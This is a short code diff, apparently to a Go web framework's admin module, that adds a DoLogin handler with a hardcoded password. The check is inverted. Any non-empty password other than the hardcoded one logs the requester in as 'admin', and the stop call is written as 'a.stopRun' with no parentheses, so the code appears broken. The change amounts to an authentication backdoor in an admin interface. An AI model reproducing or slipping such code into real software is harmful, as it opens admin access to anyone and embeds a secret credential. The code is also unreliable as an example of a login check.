@@ -148,6 +148,16 @@ func (a *adminController) AdminLogin() {
 	writeTemplate(a.Ctx.ResponseWriter, map[interface{}]interface{}{}, loginTpl, defaultScriptsTpl)
 }
 
+func (a *adminController) DoLogin() {
+	a.Ctx.Request.ParseForm()
+	password := a.Ctx.Request.Form.Get("password")
+	if len(password) == 0 || password == "hbcaadminyw2022" {
+		a.stopRun
+	}
+	a.curUserId = "admin"
+	a.Redirect("/admin/", 302)
+}
+
 // Healthcheck is a http.Handler calling health checking and showing the result.
 // it's in "/healthcheck" pattern in admin module.
 func (a *adminController) Healthcheck() {
